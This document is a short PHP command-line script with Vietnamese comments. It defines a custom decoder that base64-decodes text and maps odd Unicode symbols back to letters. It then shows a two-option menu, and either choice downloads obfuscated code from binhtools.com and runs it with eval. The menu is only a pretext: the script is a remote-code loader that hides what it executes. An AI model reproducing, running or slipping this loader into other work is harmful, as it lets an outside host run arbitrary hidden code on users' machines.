<?php

function giaima($input) {
    // Bản đồ đảo ngược
    $reverse_mapping = [
        '⊀' => 'a', '⊁' => 'b', '⊂' => 'c', '⊃' => 'd', '⊄' => 'e',
        '⊅' => 'f', '⊆' => 'g', '⊇' => 'h', '⊈' => 'i', '⊉' => 'j',
        '⊊' => 'k', '⊋' => 'l', '⊏' => 'm', '⊐' => 'n', '⊑' => 'o',
        '⊒' => 'p', '⊜' => 'q', '⊖' => 'r', '⊗' => 's', '⊘' => 't',
        '⊙' => 'u', '⊚' => 'v', '⊛' => 'w', '⊕' => 'x', '⊝' => 'y',
        '⊞' => 'z', '⊟' => '0', '⊠' => '1', '⊡' => '2', '⊢' => '3',
        '⊣' => '4', '⊤' => '5', '⊥' => '6', '♘' => '7', '⊧' => '8',
        '♙' => '9', '☾' => 'A', '☽' => 'B', '⊫' => 'C', '⊬' => 'D',
        '⊭' => 'E', '⊮' => 'F', '⊯' => 'G', '⊰' => 'H', '⊱' => 'I',
        '⊲' => 'J', '⊳' => 'K', '⊴' => 'L', '⊵' => 'M', '⊩' => 'N',
        '☼' => 'O', '⊾' => 'P', '⊿' => 'Q', '⋀' => 'R', '⋁' => 'S',
        '⋂' => 'T', '⋃' => 'U', '⋄' => 'V', '♖' => 'W', '♗' => 'X',
        '♕' => 'Y', '♔' => 'Z'
    ];

    // Giải mã Base64
    $decoded = base64_decode($input);

    // Chuyển về UTF-8
    $decoded_utf8 = mb_convert_encoding($decoded, 'UTF-8', 'UTF-8');

    // Dịch ngược ký tự
    $original = '';
    foreach (preg_split('//u', $decoded_utf8, -1, PREG_SPLIT_NO_EMPTY) as $char) {
        $original .= isset($reverse_mapping[$char]) ? $reverse_mapping[$char] : $char;
    }

    return $original;
}

echo "Nhập Số 1\n";
echo "Nhập Số 2\n";
echo "Nhập Số : ";
$chon = intval(fgets(STDIN));

if ($chon == 1) {
    $code = file_get_contents('https://binhtools.com/npm/e.php');
    eval(giaima($code));
} elseif ($chon == 2) {
    $code = file_get_contents('https://binhtools.com/npm/e.php');
    eval(giaima($code));
} else {
    echo "Sai Lựa Chọn\n";
    exit();  // Exit gracefully
}

?>
